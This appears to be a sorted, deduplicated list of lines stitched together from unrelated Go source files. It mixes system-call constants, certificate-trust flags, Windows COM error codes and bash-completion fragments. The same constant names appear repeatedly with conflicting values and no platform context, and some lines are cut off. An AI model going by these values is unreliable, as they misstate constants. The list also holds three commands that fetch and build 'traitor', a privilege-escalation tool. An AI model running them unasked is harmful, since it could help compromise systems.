CERT_TRUST_HAS_VALID_NAME_CONSTRAINTS    = 0x00000400
CERT_TRUST_HAS_WEAK_SIGNATURE                = 0x00100000
CERT_TRUST_INVALID_BASIC_CONSTRAINTS         = 0x00000400
CERT_TRUST_INVALID_EXTENSION                 = 0x00000100
CERT_TRUST_INVALID_NAME_CONSTRAINTS          = 0x00000800
CERT_TRUST_INVALID_POLICY_CONSTRAINTS        = 0x00000200
CERT_TRUST_IS_CA_TRUSTED                 = 0x00004000
CERT_TRUST_IS_COMPLEX_CHAIN              = 0x00010000
CERT_TRUST_IS_CYCLIC                         = 0x00000080
CERT_TRUST_IS_EXPLICIT_DISTRUST              = 0x04000000
CERT_TRUST_IS_FROM_EXCLUSIVE_TRUST_STORE = 0x00002000
CERT_TRUST_IS_NOT_SIGNATURE_VALID            = 0x00000008
CERT_TRUST_IS_NOT_TIME_VALID                 = 0x00000001
CERT_TRUST_IS_NOT_VALID_FOR_USAGE            = 0x00000010
CERT_TRUST_IS_OFFLINE_REVOCATION             = 0x01000000
CERT_TRUST_IS_PARTIAL_CHAIN                  = 0x00010000
CERT_TRUST_IS_PEER_TRUSTED               = 0x00000800
CERT_TRUST_IS_REVOKED                        = 0x00000004
CERT_TRUST_IS_SELF_SIGNED                = 0x00000008
CERT_TRUST_IS_UNTRUSTED_ROOT                 = 0x00000020
CERT_TRUST_NO_ERROR                          = 0x00000000
CERT_TRUST_NO_ISSUANCE_CHAIN_POLICY          = 0x02000000
CERT_TRUST_REVOCATION_STATUS_UNKNOWN         = 0x00000040
CFLUSH                                      = 0xf
CFLUSH                                  = 0xf
CFLUSH                            = 0xf
CFLUSH                         = 0xf
CFLUSH                        = 0xf
CGO_ENABLED=0 go build ./cmd/traitor
CGO_ENABLED=0 go get -u github.com/liamg/traitor/cmd/traitor
CGO_ENABLED=0 go install github.com/liamg/traitor/cmd/traitor@latest
CGROUP2_SUPER_MAGIC                         = 0x63677270
CGROUPSTATS_/ 
CGROUPSTATS_CMD_ATTR_FD       = 0x1
CGROUPSTATS_CMD_ATTR_UNSPEC   = 0x0
CGROUPSTATS_CMD_GET           = 0x4
CGROUPSTATS_CMD_NEW           = 0x5
CGROUPSTATS_CMD_UNSPEC        = 0x3
CGROUPSTATS_TYPE_CGROUP_STATS = 0x1
CGROUPSTATS_TYPE_UNSPEC       = 0x0
CGROUP_SUPER_MAGIC                          = 0x27e0eb
CHILDREN
CIBAUD                           = 0x100f0000
CIBAUD                           = 0xff0000
CIBAUD                        = 0xf0000
CID      uint16
CID   uint32
CID  uint32
CIFS_SUPER_MAGIC                            = 0xff534d42
CLASSFACTORY_E_FIRST                                                      syscall.Errno = 0x80040110
CLASSFACTORY_E_LAST                                                       syscall.Errno = 0x8004011F
CLASSFACTORY_S_FIRST                                                      syscall.Errno = 0x00040110
CLASSFACTORY_S_LAST                                                       syscall.Errno = 0x0004011F
CLASS_E_CLASSNOTAVAILABLE                                                 Handle        = 0x80040111
CLASS_E_NOAGGREGATION                                                     Handle        = 0x80040110
CLASS_E_NOTLICENSED                                                       Handle        = 0x80040112
CLIENTSITE_E_FIRST                                                        syscall.Errno = 0x80040190
CLIENTSITE_E_LAST                                                         syscall.Errno = 0x8004019F
CLIENTSITE_S_FIRST                                                        syscall.Errno = 0x00040190
CLIENTSITE_S_LAST                                                         syscall.Errno = 0x0004019F
CLIPBRD_E_BAD_DATA                                                        Handle        = 0x800401D3
CLIPBRD_E_CANT_CLOSE                                                      Handle        = 0x800401D4
CLIPBRD_E_CANT_EMPTY                                                      Handle        = 0x800401D1
CLIPBRD_E_CANT_OPEN                                                       Handle        = 0x800401D0
CLIPBRD_E_CANT_SET                                                        Handle        = 0x800401D2
CLIPBRD_E_FIRST                                                           syscall.Errno = 0x800401D0
CLIPBRD_E_LAST                                                            syscall.Errno = 0x800401DF
CLIPBRD_S_FIRST                                                           syscall.Errno = 0x000401D0
CLIPBRD_S_LAST                                                            syscall.Errno = 0x000401DF
CLOCAL                                  = 0x8000
CLOCAL                            = 0x8000
CLOCAL                           = 0x800
CLOCAL                           = 0x8000
CLOCAL                         = 0x8000
CLOCAL                        = 0x800
CLOCK_BOOTTIME                              = 0x7
CLOCK_BOOTTIME                    = 0x6
CLOCK_BOOTTIME_ALARM                        = 0x9
CLOCK_DEFAULT                               = 0x0
CLOCK_EXT                                   = 0x1
CLOCK_HIGHRES                 = 0x4
CLOCK_INT                                   = 0x2
CLOCK_LEVEL                   = 0xa
CLOCK_MONOTONIC                             = 0x1
CLOCK_MONOTONIC                         = 0x6
CLOCK_MONOTONIC                   = 0x3
CLOCK_MONOTONIC                   = 0x4
CLOCK_MONOTONIC                 = 0x1
CLOCK_MONOTONIC                = 0x4
CLOCK_MONOTONIC               = 0x4
CLOCK_MONOTONIC               = 0xa
CLOCK_MONOTONIC_COARSE                      = 0x6
CLOCK_MONOTONIC_FAST              = 0xc
CLOCK_MONOTONIC_FAST           = 0xc
CLOCK_MONOTONIC_PRECISE           = 0xb
CLOCK_MONOTONIC_PRECISE        = 0xb
CLOCK_MONOTONIC_RAW                         = 0x4
CLOCK_MONOTONIC_RAW                     = 0x4
CLOCK_MONOTONIC_RAW_APPROX              = 0x5
CLOCK_PROCESS_CPUTIME_ID                    = 0x2
CLOCK_PROCESS_CPUTIME_ID                = 0xc
CLOCK_PROCESS_CPUTIME_ID          = 0x2
CLOCK_PROCESS_CPUTIME_ID          = 0xf
CLOCK_PROCESS_CPUTIME_ID        = 0x2
CLOCK_PROCESS_CPUTIME_ID       = 0xf
CLOCK_PROCESS_CPUTIME_ID      = 0x5
CLOCK_PROCESS_CPUTIME_ID      = 0xb
CLOCK_PROF                        = 0x2
CLOCK_PROF                     = 0x2
CLOCK_PROF                    = 0x2
CLOCK_REALTIME                              = 0x0
CLOCK_REALTIME                          = 0x0
CLOCK_REALTIME                    = 0x0
CLOCK_REALTIME                  = 0x0
CLOCK_REALTIME                 = 0x0
CLOCK_REALTIME                = 0x3
CLOCK_REALTIME                = 0x9
CLOCK_REALTIME_ALARM                        = 0x8
CLOCK_REALTIME_COARSE                       = 0x5
CLOCK_REALTIME_FAST               = 0xa
CLOCK_REALTIME_FAST            = 0xa
CLOCK_REALTIME_PRECISE            = 0x9
CLOCK_REALTIME_PRECISE         = 0x9
CLOCK_SECOND                      = 0xd
CLOCK_SECOND                   = 0xd
CLOCK_TAI                                   = 0xb
CLOCK_THREAD_CPUTIME_ID                     = 0x3
CLOCK_THREAD_CPUTIME_ID                 = 0x10
CLOCK_THREAD_CPUTIME_ID           = 0x4
CLOCK_THREAD_CPUTIME_ID           = 0xe
CLOCK_THREAD_CPUTIME_ID         = 0x3
CLOCK_THREAD_CPUTIME_ID        = 0xe
CLOCK_THREAD_CPUTIME_ID       = 0x2
CLOCK_THREAD_CPUTIME_ID       = 0xc
CLOCK_TXFROMRX                              = 0x4
CLOCK_TXINT                                 = 0x3
CLOCK_UPTIME                      = 0x5
CLOCK_UPTIME                   = 0x5
CLOCK_UPTIME_FAST                 = 0x8
CLOCK_UPTIME_FAST              = 0x8
CLOCK_UPTIME_PRECISE              = 0x7
CLOCK_UPTIME_PRECISE           = 0x7
CLOCK_UPTIME_RAW                        = 0x8
CLOCK_UPTIME_RAW_APPROX                 = 0x9
CLOCK_VIRTUAL                     = 0x1
CLOCK_VIRTUAL                  = 0x1
CLOCK_VIRTUAL                 = 0x1
CLONE_ARGS_SIZE_VER0                        = 0x40
CLONE_ARGS_SIZE_VER1                        = 0x50
CLONE_ARGS_SIZE_VER2                        = 0x58
CLONE_CHILD_CLEARTID                        = 0x200000
CLONE_CHILD_SETTID                          = 0x1000000
CLONE_CLEAR_SIGHAND                         = 0x100000000
CLONE_CSIGNAL                     = 0xff
CLONE_DETACHED                              = 0x400000
CLONE_FILES                                 = 0x400
CLONE_FILES                       = 0x400
CLONE_FS                                    = 0x200
CLONE_FS                          = 0x200
CLONE_INTO_CGROUP                           = 0x200000000
CLONE_IO                                    = 0x80000000
CLONE_NEWCGROUP                             = 0x2000000
CLONE_NEWIPC                                = 0x8000000
CLONE_NEWNET                                = 0x40000000
CLONE_NEWNS                                 = 0x20000
CLONE_NEWPID                                = 0x20000000
CLONE_NEWTIME                               = 0x80
CLONE_NEWUSER                               = 0x10000000
CLONE_NEWUTS                                = 0x4000000
CLONE_NOFOLLOW                          = 0x1
CLONE_NOOWNERCOPY                       = 0x2
CLONE_PARENT                                = 0x8000
CLONE_PARENT_SETTID                         = 0x100000
CLONE_PID                         = 0x1000
CLONE_PIDFD                                 = 0x1000
CLONE_PTRACE                                = 0x2000
CLONE_PTRACE                      = 0x2000
CLONE_SETTLS                                = 0x80000
CLONE_SIGHAND                               = 0x800
CLONE_SIGHAND                     = 0x800
CLONE_SYSVSEM                               = 0x40000
CLONE_THREAD                                = 0x10000
CLONE_UNTRACED                              = 0x800000
CLONE_VFORK                                 = 0x4000
CLONE_VFORK                       = 0x4000
CLONE_VM                                    = 0x100
CLONE_VM                          = 0x100
CLONE_[A-Z_]
CLOSE_RANGE_CLOEXEC = 0x4
CLOSE_RANGE_UNSHARE = 0x2
CLSCTX_ACTIVATE_32_BIT_SERVER = 0x40000
CLSCTX_ACTIVATE_64_BIT_SERVER = 0x80000
CLSCTX_ACTIVATE_AAA_AS_IU     = 0x800000
CLSCTX_APPCONTAINER           = 0x400000
CLSCTX_DISABLE_AAA            = 0x8000
CLSCTX_ENABLE_AAA             = 0x10000
CLSCTX_ENABLE_CLOAKING        = 0x100000
CLSCTX_ENABLE_CODE_DOWNLOAD   = 0x2000
CLSCTX_FROM_DEFAULT_CONTEXT   = 0x20000
CLSCTX_INPROC_HANDLER         = 0x2
CLSCTX_INPROC_HANDLER16       = 0x20
CLSCTX_INPROC_SERVER          = 0x1
CLSCTX_INPROC_SERVER16        = 0x8
CLSCTX_LOCAL_SERVER           = 0x4
CLSCTX_NO_CODE_DOWNLOAD       = 0x400
CLSCTX_NO_CUSTOM_MARSHAL      = 0x1000
CLSCTX_NO_FAILURE_LOG         = 0x4000
CLSCTX_PS_DLL                 = 0x80000000
CLSCTX_REMOTE_SERVER          = 0x10
CLSCTX_RESERVED1              = 0x40
CLSCTX_RESERVED2              = 0x80
CLSCTX_RESERVED3              = 0x100
CLSCTX_RESERVED4              = 0x200
CLSCTX_RESERVED5              = 0x800
CMSPAR                                      = 0x40000000
CM_GET_DEVICE_INTERFACE_LIST_PRESENT     = 0 // only currently 'live' device interfaces
COAUTHIDENTITY
COAUTHINFO
COBRA_ACTIVE_HELP
CODA_SUPER_MAGIC                            = 0x73757245
COINIT_APARTMENTTHREADED = 0x2
COINIT_DISABLE_OLE1DDE   = 0x4
COINIT_MULTITHREADED     = 0x0
COINIT_SPEED_OVER_MEMORY = 0x8
COMADMIN_E_ALREADYINSTALLED                                               Handle        = 0x80110404
COMADMIN_E_AMBIGUOUS_APPLICATION_NAME                                     Handle        = 0x8011045C
COMADMIN_E_AMBIGUOUS_PARTITION_NAME                                       Handle        = 0x8011045D
COMADMIN_E_APPDIRNOTFOUND                                                 Handle        = 0x8011041F
COMADMIN_E_APPLICATIONEXISTS                                              Handle        = 0x8011040B
COMADMIN_E_APPLID_MATCHES_CLSID                                           Handle        = 0x80110446
COMADMIN_E_APP_FILE_READFAIL                                              Handle        = 0x80110408
COMADMIN_E_APP_FILE_VERSION                                               Handle        = 0x80110409
COMADMIN_E_APP_FILE_WRITEFAIL                                             Handle        = 0x80110407
COMADMIN_E_APP_NOT_RUNNING                                                Handle        = 0x8011080A
COMADMIN_E_AUTHENTICATIONLEVEL                                            Handle        = 0x80110413
COMADMIN_E_BADPATH                                                        Handle        = 0x8011040A
COMADMIN_E_BADREGISTRYLIBID                                               Handle        = 0x8011041E
COMADMIN_E_BADREGISTRYPROGID                                              Handle        = 0x80110412
COMADMIN_E_BASEPARTITION_REQUIRED_IN_SET                                  Handle        = 0x8011081F
COMADMIN_E_BASE_PARTITION_ONLY                                            Handle        = 0x80110450
COMADMIN_E_CANNOT_ALIAS_EVENTCLASS                                        Handle        = 0x80110820
COMADMIN_E_CANTCOPYFILE                                                   Handle        = 0x8011040D
COMADMIN_E_CANTMAKEINPROCSERVICE                                          Handle        = 0x80110814
COMADMIN_E_CANTRECYCLELIBRARYAPPS                                         Handle        = 0x8011080F
COMADMIN_E_CANTRECYCLESERVICEAPPS                                         Handle        = 0x80110811
COMADMIN_E_CANT_SUBSCRIBE_TO_COMPONENT                                    Handle        = 0x8011044D
COMADMIN_E_CAN_NOT_EXPORT_APP_PROXY                                       Handle        = 0x8011044A
COMADMIN_E_CAN_NOT_EXPORT_SYS_APP                                         Handle        = 0x8011044C
COMADMIN_E_CAN_NOT_START_APP                                              Handle        = 0x8011044B
COMADMIN_E_CAT_BITNESSMISMATCH                                            Handle        = 0x80110482
COMADMIN_E_CAT_DUPLICATE_PARTITION_NAME                                   Handle        = 0x80110457
COMADMIN_E_CAT_IMPORTED_COMPONENTS_NOT_ALLOWED                            Handle        = 0x8011045B
COMADMIN_E_CAT_INVALID_PARTITION_NAME                                     Handle        = 0x80110458
COMADMIN_E_CAT_PARTITION_IN_USE                                           Handle        = 0x80110459
COMADMIN_E_CAT_PAUSE_RESUME_NOT_SUPPORTED                                 Handle        = 0x80110485
COMADMIN_E_CAT_SERVERFAULT                                                Handle        = 0x80110486
COMADMIN_E_CAT_UNACCEPTABLEBITNESS                                        Handle        = 0x80110483
COMADMIN_E_CAT_WRONGAPPBITNESS                                            Handle        = 0x80110484
COMADMIN_E_CLSIDORIIDMISMATCH                                             Handle        = 0x80110418
COMADMIN_E_COMPFILE_BADTLB                                                Handle        = 0x80110428
COMADMIN_E_COMPFILE_CLASSNOTAVAIL                                         Handle        = 0x80110427
COMADMIN_E_COMPFILE_DOESNOTEXIST                                          Handle        = 0x80110424
COMADMIN_E_COMPFILE_GETCLASSOBJ                                           Handle        = 0x80110426
COMADMIN_E_COMPFILE_LOADDLLFAIL                                           Handle        = 0x80110425
COMADMIN_E_COMPFILE_NOREGISTRAR                                           Handle        = 0x80110434
COMADMIN_E_COMPFILE_NOTINSTALLABLE                                        Handle        = 0x80110429
COMADMIN_E_COMPONENTEXISTS                                                Handle        = 0x80110439
COMADMIN_E_COMP_MOVE_BAD_DEST                                             Handle        = 0x8011042E
COMADMIN_E_COMP_MOVE_DEST                                                 Handle        = 0x8011081D
COMADMIN_E_COMP_MOVE_LOCKED                                               Handle        = 0x8011042D
COMADMIN_E_COMP_MOVE_PRIVATE                                              Handle        = 0x8011081E
COMADMIN_E_COMP_MOVE_SOURCE                                               Handle        = 0x8011081C
COMADMIN_E_COREQCOMPINSTALLED                                             Handle        = 0x80110435
COMADMIN_E_DEFAULT_PARTITION_NOT_IN_SET                                   Handle        = 0x80110816
COMADMIN_E_DLLLOADFAILED                                                  Handle        = 0x8011041D
COMADMIN_E_DLLREGISTERSERVER                                              Handle        = 0x8011041A
COMADMIN_E_EVENTCLASS_CANT_BE_SUBSCRIBER                                  Handle        = 0x8011044E
COMADMIN_E_FILE_PARTITION_DUPLICATE_FILES                                 Handle        = 0x8011045A
COMADMIN_E_INVALIDUSERIDS                                                 Handle        = 0x80110410
COMADMIN_E_INVALID_PARTITION                                              Handle        = 0x8011080B
COMADMIN_E_KEYMISSING                                                     Handle        = 0x80110403
COMADMIN_E_LEGACYCOMPS_NOT_ALLOWED_IN_1_0_FORMAT                          Handle        = 0x8011081A
COMADMIN_E_LEGACYCOMPS_NOT_ALLOWED_IN_NONBASE_PARTITIONS                  Handle        = 0x8011081B
COMADMIN_E_LIB_APP_PROXY_INCOMPATIBLE                                     Handle        = 0x8011044F
COMADMIN_E_MIG_SCHEMANOTFOUND                                             Handle        = 0x80110481
COMADMIN_E_MIG_VERSIONNOTSUPPORTED                                        Handle        = 0x80110480
COMADMIN_E_NOREGISTRYCLSID                                                Handle        = 0x80110411
COMADMIN_E_NOSERVERSHARE                                                  Handle        = 0x8011041B
COMADMIN_E_NOTCHANGEABLE                                                  Handle        = 0x8011042A
COMADMIN_E_NOTDELETEABLE                                                  Handle        = 0x8011042B
COMADMIN_E_NOTINREGISTRY                                                  Handle        = 0x8011043E
COMADMIN_E_NOUSER                                                         Handle        = 0x8011040F
COMADMIN_E_OBJECTERRORS                                                   Handle        = 0x80110401
COMADMIN_E_OBJECTEXISTS                                                   Handle        = 0x80110438
COMADMIN_E_OBJECTINVALID                                                  Handle        = 0x80110402
COMADMIN_E_OBJECTNOTPOOLABLE                                              Handle        = 0x8011043F
COMADMIN_E_OBJECT_DOES_NOT_EXIST                                          Handle        = 0x80110809
COMADMIN_E_OBJECT_PARENT_MISSING                                          Handle        = 0x80110808
COMADMIN_E_PARTITIONS_DISABLED                                            Handle        = 0x80110824
COMADMIN_E_PARTITION_ACCESSDENIED                                         Handle        = 0x80110818
COMADMIN_E_PARTITION_MSI_ONLY                                             Handle        = 0x80110819
COMADMIN_E_PAUSEDPROCESSMAYNOTBERECYCLED                                  Handle        = 0x80110813
COMADMIN_E_PRIVATE_ACCESSDENIED                                           Handle        = 0x80110821
COMADMIN_E_PROCESSALREADYRECYCLED                                         Handle        = 0x80110812
COMADMIN_E_PROGIDINUSEBYCLSID                                             Handle        = 0x80110815
COMADMIN_E_PROPERTYSAVEFAILED                                             Handle        = 0x80110437
COMADMIN_E_PROPERTY_OVERFLOW                                              Handle        = 0x8011043C
COMADMIN_E_RECYCLEDPROCESSMAYNOTBEPAUSED                                  Handle        = 0x80110817
COMADMIN_E_REGDB_ALREADYRUNNING                                           Handle        = 0x80110475
COMADMIN_E_REGDB_NOTINITIALIZED                                           Handle        = 0x80110472
COMADMIN_E_REGDB_NOTOPEN                                                  Handle        = 0x80110473
COMADMIN_E_REGDB_SYSTEMERR                                                Handle        = 0x80110474
COMADMIN_E_REGFILE_CORRUPT                                                Handle        = 0x8011043B
COMADMIN_E_REGISTERTLB                                                    Handle        = 0x80110430
COMADMIN_E_REGISTRARFAILED                                                Handle        = 0x80110423
COMADMIN_E_REGISTRY_ACCESSDENIED                                          Handle        = 0x80110823
COMADMIN_E_REMOTEINTERFACE                                                Handle        = 0x80110419
COMADMIN_E_REQUIRES_DIFFERENT_PLATFORM                                    Handle        = 0x80110449
COMADMIN_E_ROLEEXISTS                                                     Handle        = 0x8011040C
COMADMIN_E_ROLE_DOES_NOT_EXIST                                            Handle        = 0x80110447
COMADMIN_E_SAFERINVALID                                                   Handle        = 0x80110822
COMADMIN_E_SERVICENOTINSTALLED                                            Handle        = 0x80110436
COMADMIN_E_SESSION                                                        Handle        = 0x8011042C
COMADMIN_E_START_APP_DISABLED                                             Handle        = 0x80110451
COMADMIN_E_START_APP_NEEDS_COMPONENTS                                     Handle        = 0x80110448
COMADMIN_E_SVCAPP_NOT_POOLABLE_OR_RECYCLABLE                              Handle        = 0x8011080D
COMADMIN_E_SYSTEMAPP                                                      Handle        = 0x80110433
COMADMIN_E_USERPASSWDNOTVALID                                             Handle        = 0x80110414
COMADMIN_E_USER_IN_SET                                                    Handle        = 0x8011080E
COMM
COMPREPLY
COMPREPLY[
COMPREPLY[@]} -eq 0 
COMPREPLY[@]} -eq 0 ]]
COMQC_E_APPLICATION_NOT_QUEUED                                            Handle        = 0x80110600
COMQC_E_BAD_MESSAGE                                                       Handle        = 0x80110604
COMQC_E_NO_IPERSISTSTREAM                                                 Handle        = 0x80110603
COMQC_E_NO_QUEUEABLE_INTERFACES                                           Handle        = 0x80110601
COMQC_E_QUEUING_SERVICE_NOT_AVAILABLE                                     Handle        = 0x80110602
COMQC_E_UNAUTHENTICATED                                                   Handle        = 0x80110605
COMQC_E_UNTRUSTED_ENQUEUER                                                Handle        = 0x80110606
CONFIGMG_VERSION    = 0x0400
CONTAINER_INHERIT_ACE              = 0x2
CONTEXT_E_ABORTED                                                         Handle        = 0x8004E002
CONTEXT_E_ABORTING                                                        Handle        = 0x8004E003
CONTEXT_E_FIRST                                                           syscall.Errno = 0x8004E000
CONTEXT_E_LAST                                                            syscall.Errno = 0x8004E02F
CONTEXT_E_NOCONTEXT                                                       Handle        = 0x8004E004
CONTEXT_E_NOJIT                                                           Handle        = 0x8004E026
CONTEXT_E_NOTRANSACTION                                                   Handle        = 0x8004E027
CONTEXT_E_OLDREF                                                          Handle        = 0x8004E007
CONTEXT_E_ROLENOTFOUND                                                    Handle        = 0x8004E00C
CONTEXT_E_SYNCH_TIMEOUT                                                   Handle        = 0x8004E006
CONTEXT_E_TMNOTAVAILABLE                                                  Handle        = 0x8004E00F
CONTEXT_E_WOULD_DEADLOCK                                                  Handle        = 0x8004E005
CONTEXT_S_FIRST                                                           syscall.Errno = 0x0004E000
CONTEXT_S_LAST                                                            syscall.Errno = 0x0004E02F
CONVERT10_E_FIRST                                                         syscall.Errno = 0x800401C0
CONVERT10_E_LAST                                                          syscall.Errno = 0x800401CF
CONVERT10_E_OLESTREAM_BITMAP_TO_DIB                                       Handle        = 0x800401C3
CONVERT10_E_OLESTREAM_FMT                                                 Handle        = 0x800401C2
CONVERT10_E_OLESTREAM_GET                                                 Handle        = 0x800401C0
CONVERT10_E_OLESTREAM_PUT                                                 Handle        = 0x800401C1
CONVERT10_E_STG_DIB_TO_BITMAP                                             Handle        = 0x800401C6
CONVERT10_E_STG_FMT                                                       Handle        = 0x800401C4
CONVERT10_E_STG_NO_STD_STREAM                                             Handle        = 0x800401C5
CONVERT10_S_FIRST                                                         syscall.Errno = 0x000401C0
CONVERT10_S_LAST                                                          syscall.Errno = 0x000401CF
CONVERT10_S_NO_PRESENTATION                                               Handle        = 0x000401C0
CORE
COSERVERINFO
CO_E_ACCESSCHECKFAILED                                                    Handle        = 0x8001012A
CO_E_ACESINWRONGORDER                                                     Handle        = 0x8001013A
CO_E_ACNOTINITIALIZED                                                     Handle        = 0x8001013F
CO_E_ACTIVATIONFAILED                                                     Handle        = 0x8004E021
CO_E_ACTIVATIONFAILED_CATALOGERROR                                        Handle        = 0x8004E023
CO_E_ACTIVATIONFAILED_EVENTLOGGED                                         Handle        = 0x8004E022
CO_E_ACTIVATIONFAILED_TIMEOUT                                             Handle        = 0x8004E024
CO_E_ALREADYINITIALIZED                                                   Handle        = 0x800401F1
CO_E_APPDIDNTREG                                                          Handle        = 0x800401FE
CO_E_APPNOTFOUND                                                          Handle        = 0x800401F5
CO_E_APPSINGLEUSE                                                         Handle        = 0x800401F6
CO_E_ASYNC_WORK_REJECTED                                                  Handle        = 0x80004029
CO_E_ATTEMPT_TO_CREATE_OUTSIDE_CLIENT_CONTEXT                             Handle        = 0x80004024
CO_E_BAD_PATH                                                             Handle        = 0x80080004
CO_E_BAD_SERVER_NAME                                                      Handle        = 0x80004014
CO_E_CALL_OUT_OF_TX_SCOPE_NOT_ALLOWED                                     Handle        = 0x8004E030
CO_E_CANCEL_DISABLED                                                      Handle        = 0x80010140
CO_E_CANTDETERMINECLASS                                                   Handle        = 0x800401F2
CO_E_CANT_REMOTE                                                          Handle        = 0x80004013
CO_E_CLASSSTRING                                                          Handle        = 0x800401F3
CO_E_CLASS_CREATE_FAILED                                                  Handle        = 0x80080001
CO_E_CLASS_DISABLED                                                       Handle        = 0x80004027
CO_E_CLRNOTAVAILABLE                                                      Handle        = 0x80004028
CO_E_CLSREG_INCONSISTENT                                                  Handle        = 0x8000401F
CO_E_CONVERSIONFAILED                                                     Handle        = 0x8001012E
CO_E_CREATEPROCESS_FAILURE                                                Handle        = 0x80004018
CO_E_DBERROR                                                              Handle        = 0x8004E02B
CO_E_DECODEFAILED                                                         Handle        = 0x8001013D
CO_E_DLLNOTFOUND                                                          Handle        = 0x800401F8
CO_E_ELEVATION_DISABLED                                                   Handle        = 0x80080017
CO_E_ERRORINAPP                                                           Handle        = 0x800401F7
CO_E_ERRORINDLL                                                           Handle        = 0x800401F9
CO_E_EXCEEDSYSACLLIMIT                                                    Handle        = 0x80010139
CO_E_EXIT_TRANSACTION_SCOPE_NOT_CALLED                                    Handle        = 0x8004E031
CO_E_FAILEDTOCLOSEHANDLE                                                  Handle        = 0x80010138
CO_E_FAILEDTOCREATEFILE                                                   Handle        = 0x80010137
CO_E_FAILEDTOGENUUID                                                      Handle        = 0x80010136
CO_E_FAILEDTOGETSECCTX                                                    Handle        = 0x80010124
CO_E_FAILEDTOGETTOKENINFO                                                 Handle        = 0x80010126
CO_E_FAILEDTOGETWINDIR                                                    Handle        = 0x80010134
CO_E_FAILEDTOIMPERSONATE                                                  Handle        = 0x80010123
CO_E_FAILEDTOOPENPROCESSTOKEN                                             Handle        = 0x8001013C
CO_E_FAILEDTOOPENTHREADTOKEN                                              Handle        = 0x80010125
CO_E_FAILEDTOQUERYCLIENTBLANKET                                           Handle        = 0x80010128
CO_E_FAILEDTOSETDACL                                                      Handle        = 0x80010129
CO_E_FIRST                                                                syscall.Errno = 0x800401F0
CO_E_IIDREG_INCONSISTENT                                                  Handle        = 0x80004020
CO_E_IIDSTRING                                                            Handle        = 0x800401F4
CO_E_INCOMPATIBLESTREAMVERSION                                            Handle        = 0x8001013B
CO_E_INITIALIZATIONFAILED                                                 Handle        = 0x8004E025
CO_E_INIT_CLASS_CACHE                                                     Handle        = 0x80004009
CO_E_INIT_MEMORY_ALLOCATOR                                                Handle        = 0x80004008
CO_E_INIT_ONLY_SINGLE_THREADED                                            Handle        = 0x80004012
CO_E_INIT_RPC_CHANNEL                                                     Handle        = 0x8000400A
CO_E_INIT_SCM_EXEC_FAILURE                                                Handle        = 0x80004011
CO_E_INIT_SCM_FILE_MAPPING_EXISTS                                         Handle        = 0x8000400F
CO_E_INIT_SCM_MAP_VIEW_OF_FILE                                            Handle        = 0x80004010
CO_E_INIT_SCM_MUTEX_EXISTS                                                Handle        = 0x8000400E
CO_E_INIT_SHARED_ALLOCATOR                                                Handle        = 0x80004007
CO_E_INIT_TLS                                                             Handle        = 0x80004006
CO_E_INIT_TLS_CHANNEL_CONTROL                                             Handle        = 0x8000400C
CO_E_INIT_TLS_SET_CHANNEL_CONTROL                                         Handle        = 0x8000400B
CO_E_INIT_UNACCEPTED_USER_ALLOCATOR                                       Handle        = 0x8000400D
CO_E_INVALIDSID                                                           Handle        = 0x8001012D
CO_E_ISOLEVELMISMATCH                                                     Handle        = 0x8004E02F
CO_E_LAST                                                                 syscall.Errno = 0x800401FF
CO_E_LAUNCH_PERMSSION_DENIED                                              Handle        = 0x8000401B
CO_E_LOOKUPACCNAMEFAILED                                                  Handle        = 0x80010132
CO_E_LOOKUPACCSIDFAILED                                                   Handle        = 0x80010130
CO_E_MALFORMED_SPN                                                        Handle        = 0x80004033
CO_E_MISSING_DISPLAYNAME                                                  Handle        = 0x80080015
CO_E_MSI_ERROR                                                            Handle        = 0x80004023
CO_E_NETACCESSAPIFAILED                                                   Handle        = 0x8001012B
CO_E_NOCOOKIES                                                            Handle        = 0x8004E02A
CO_E_NOIISINTRINSICS                                                      Handle        = 0x8004E029
CO_E_NOMATCHINGNAMEFOUND                                                  Handle        = 0x80010131
CO_E_NOMATCHINGSIDFOUND                                                   Handle        = 0x8001012F
CO_E_NOSYNCHRONIZATION                                                    Handle        = 0x8004E02E
CO_E_NOTCONSTRUCTED                                                       Handle        = 0x8004E02D
CO_E_NOTINITIALIZED                                                       Handle        = 0x800401F0
CO_E_NOTPOOLED                                                            Handle        = 0x8004E02C
CO_E_NOT_SUPPORTED                                                        Handle        = 0x80004021
CO_E_NO_SECCTX_IN_ACTIVATE                                                Handle        = 0x8000402B
CO_E_OBJISREG                                                             Handle        = 0x800401FC
CO_E_OBJNOTCONNECTED                                                      Handle        = 0x800401FD
CO_E_OBJNOTREG                                                            Handle        = 0x800401FB
CO_E_OBJSRV_RPC_FAILURE                                                   Handle        = 0x80080006
CO_E_OLE1DDE_DISABLED                                                     Handle        = 0x80004016
CO_E_PATHTOOLONG                                                          Handle        = 0x80010135
CO_E_PREMATURE_STUB_RUNDOWN                                               Handle        = 0x80004035
CO_E_RELEASED                                                             Handle        = 0x800401FF
CO_E_RELOAD_DLL                                                           Handle        = 0x80004022
CO_E_REMOTE_COMMUNICATION_FAILURE                                         Handle        = 0x8000401D
CO_E_RUNAS_CREATEPROCESS_FAILURE                                          Handle        = 0x80004019
CO_E_RUNAS_LOGON_FAILURE                                                  Handle        = 0x8000401A
CO_E_RUNAS_SYNTAX                                                         Handle        = 0x80004017
CO_E_RUNAS_VALUE_MUST_BE_AAA                                              Handle        = 0x80080016
CO_E_SCM_ERROR                                                            Handle        = 0x80080002
CO_E_SCM_RPC_FAILURE                                                      Handle        = 0x80080003
CO_E_SERVER_EXEC_FAILURE                                                  Handle        = 0x80080005
CO_E_SERVER_INIT_TIMEOUT                                                  Handle        = 0x8000402A
CO_E_SERVER_NOT_PAUSED                                                    Handle        = 0x80004026
CO_E_SERVER_PAUSED                                                        Handle        = 0x80004025
CO_E_SERVER_START_TIMEOUT                                                 Handle        = 0x8000401E
CO_E_SERVER_STOPPING                                                      Handle        = 0x80080008
CO_E_SETSERLHNDLFAILED                                                    Handle        = 0x80010133
CO_E_START_SERVICE_FAILURE                                                Handle        = 0x8000401C
CO_E_SXS_CONFIG                                                           Handle        = 0x80004032
CO_E_THREADINGMODEL_CHANGED                                               Handle        = 0x8004E028
CO_E_THREADPOOL_CONFIG                                                    Handle        = 0x80004031
CO_E_TRACKER_CONFIG                                                       Handle        = 0x80004030
CO_E_TRUSTEEDOESNTMATCHCLIENT                                             Handle        = 0x80010127
CO_E_UNREVOKED_REGISTRATION_ON_APARTMENT_SHUTDOWN                         Handle        = 0x80004034
CO_E_WRONGOSFORAPP                                                        Handle        = 0x800401FA
CO_E_WRONGTRUSTEENAMESYNTAX                                               Handle        = 0x8001012C
CO_E_WRONG_SERVER_IDENTITY                                                Handle        = 0x80004015
